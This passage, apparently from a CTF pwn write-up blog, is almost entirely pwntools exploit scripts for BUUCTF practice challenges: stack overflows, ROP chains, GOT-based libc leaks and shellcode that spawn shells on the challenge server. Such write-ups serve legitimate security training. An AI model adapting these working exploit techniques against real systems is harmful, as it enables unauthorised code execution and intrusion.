class=\"line\"></span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">ru(&quot;here is the gift for u:&quot;)</span><br><span class=\"line\">printf &#x3D; int(ru(&#39;\\n&#39;)[2:],16)</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class=\"line\">one_gadget &#x3D; 0x106ef8</span><br><span class=\"line\">leak(&quot;printf&quot;,libcbase)</span><br><span class=\"line\">sys &#x3D; libcbase + one_gadget</span><br><span class=\"line\">payload &#x3D; str(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babystack\"><a href=\"#bjdctf-2020-babystack\" class=\"headerlink\" title=\"bjdctf_2020_babystack\"></a>bjdctf_2020_babystack</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sl(32)</span><br><span class=\"line\">sys &#x3D; 0x4006E6</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"HarekazeCTF2019-baby-rop\"><a href=\"#HarekazeCTF2019-baby-rop\" class=\"headerlink\" title=\"[HarekazeCTF2019]baby_rop\"></a>[HarekazeCTF2019]baby_rop</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sys &#x3D; 0x400490</span><br><span class=\"line\">bin_sh &#x3D; 0x601048</span><br><span class=\"line\">pop_rdi &#x3D; 0x400683</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level2-x64\"><a href=\"#jarvisoj-level2-x64\" class=\"headerlink\" title=\"jarvisoj_level2_x64\"></a>jarvisoj_level2_x64</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sys &#x3D; 0x4004C0</span><br><span class=\"line\">bin_sh &#x3D; 0x600A90</span><br><span class=\"line\">pop_rdi &#x3D; 0x4006b3</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-5\"><a href=\"#ciscn-2019-n-5\" class=\"headerlink\" title=\"ciscn_2019_n_5\"></a>ciscn_2019_n_5</h2><blockquote>\n<p>shellcode</p>\n<p>shellcode</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ret &#x3D; 0x4004c9</span><br><span class=\"line\">bss &#x3D; 0x601080</span><br><span class=\"line\">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class=\"line\">print(len(shellcode))</span><br><span class=\"line\">sla(&quot;tell me your name\\n&quot;,shellcode)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class=\"line\">sla(&quot;me?\\n&quot;,payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-ne-5\"><a href=\"#ciscn-2019-ne-5\" class=\"headerlink\" title=\"ciscn_2019_ne_5\"></a>ciscn_2019_ne_5</h2><blockquote>\n<p>32puts</p>\n<p>putgot</p>\n<p></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29708</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(log)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\"Please input new log info:\"</span>)</span><br><span class=\"line\">    sl(log)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getflag</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn14\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">sl(<span class=\"string\">\"administrator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x8048722</span></span><br><span class=\"line\">sys = <span class=\"number\">0x80484D0</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x48</span>+<span class=\"number\">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">getflag()</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">printf = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">print(printf)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"printf\"</span>,printf)</span><br><span class=\"line\">libc_base = printf - libc.dump(<span class=\"string\">\"printf\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"printf\"</span>,libc_base)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"administrator\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x48</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">getflag()</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"--2018-rop-32write\"><a href=\"#--2018-rop-32write\" class=\"headerlink\" title=\"()_2018_rop(32write)\"></a>()_2018_rop(32write)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27242</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn15\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">main = <span class=\"number\">0x80484C6</span></span><br><span class=\"line\">write_plt = elf.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">0</span>) + p32(write_got) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"write\"</span>,write)</span><br><span class=\"line\">libc_base = write - libc.dump(<span class=\"string\">\"write\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"write\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babyrop-64puts\"><a href=\"#bjdctf-2020-babyrop-64puts\" class=\"headerlink\" title=\"bjdctf_2020_babyrop(64puts)\"></a>bjdctf_2020_babyrop(64puts)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27648</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn17\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">main = <span class=\"number\">0x4006AD</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400733</span></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>,payload)</span><br><span class=\"line\">puts = uu64(ru(<span class=\"string\">'\\n'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"others-shellcode\"><a href=\"#others-shellcode\" class=\"headerlink\" title=\"others_shellcode\"></a>others_shellcode</h2><p></p>\n<h2 id=\"pwn2-sctf-201632printf\"><a href=\"#pwn2-sctf-201632printf\" class=\"headerlink\" title=\"pwn2_sctf_201632printf\"></a>pwn2_sctf_201632printf</h2><blockquote>\n<p>prinfgot</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28222</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn19\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"/lib32/libc.so.6\")</span></span><br><span class=\"line\">vuln = <span class=\"number\">0x804852F</span></span><br><span class=\"line\">formats = <span class=\"number\">0x80486A8</span></span><br><span class=\"line\">printf_plt = elf.sym[<span class=\"string\">\"printf\"</span>]</span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">\"atoi\"</span>]</span><br><span class=\"line\">sl(<span class=\"number\">-1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x2c</span>+<span class=\"number\">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">atoi = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"atoi\"</span>,atoi)</span><br><span class=\"line\">libc_base = atoi - libc.dump(<span class=\"string\">'atoi'</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x2c</span>+<span class=\"number\">0x4</span>) + p32(sys) +p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">sl(<span class=\"number\">-1</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"HarekazeCTF2019-baby-rop2-64printf\"><a href=\"#HarekazeCTF2019-baby-rop2-64printf\" class=\"headerlink\" title=\"[HarekazeCTF2019]baby_rop2(64printf)\"></a>[HarekazeCTF2019]baby_rop2(64printf)</h2><blockquote>\n<p>printfgot</p>\n<p></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28714</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn21\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">vuln = <span class=\"number\">0x400636</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400733</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4004d1</span></span><br><span class=\"line\">printf_plt = elf.sym[<span class=\"string\">\"printf\"</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">read = uu64(ru(<span class=\"string\">\"What's\"</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"read\"</span>,read)</span><br><span class=\"line\">libc_base = read - libc.dump(<span class=\"string\">'read'</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ez-pz-hackover-2016\"><a href=\"#ez-pz-hackover-2016\" class=\"headerlink\" title=\"ez_pz_hackover_2016\"></a>ez_pz_hackover_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28640</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn22\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Yippie, lets crash: \"</span>)</span><br><span class=\"line\">stack = int(ru(<span class=\"string\">'\\n'</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"comment\">#print(stack)</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = <span class=\"string\">\"crashme\\x00\"</span>  + <span class=\"string\">b'A'</span>*(<span class=\"number\">0x16</span><span class=\"number\">-8</span>+<span class=\"number\">4</span>) + p32(stack<span class=\"number\">-0x1c</span>) + shellcode</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level3\"><a href=\"#jarvisoj-level3\" class=\"headerlink\" title=\"jarvisoj_level3\"></a>jarvisoj_level3</h2><p>write</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.231.so\"</span>)</span><br><span class=\"line\">main = elf.sym[<span class=\"string\">\"main\"</span>]</span><br><span class=\"line\">write_plt = elf.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">0x4</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc_base = write - libc.sym[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.sym[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">sh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0</span>) + p32(sh)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input:\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-fm\"><a href=\"#jarvisoj-fm\" class=\"headerlink\" title=\"jarvisoj_fm\"></a>jarvisoj_fm</h2><p>fmt</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.4\"</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span 